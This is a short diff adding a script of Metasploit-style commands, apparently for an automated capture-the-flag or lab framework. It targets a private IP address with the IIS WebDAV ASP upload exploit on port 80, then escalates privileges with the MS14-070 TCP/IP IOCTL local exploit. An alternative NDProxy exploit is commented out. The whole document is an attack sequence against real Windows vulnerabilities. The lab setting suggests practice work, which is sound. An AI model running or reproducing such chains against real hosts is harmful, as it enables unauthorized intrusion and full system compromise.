@@ -1,0 +1,13 @@
+set_target 10.10.10.15;
+
+exploit/windows/iis/iis_webdav_upload_asp;
+set_default_game_options;
+set rport 80;
+run;
+
+set_game_type PRIVESC;
+exploit/windows/local/ms14_070_tcpip_ioctl
+
+#exploit/windows/local/ms_ndproxy;
+set_default_game_options;
+run;
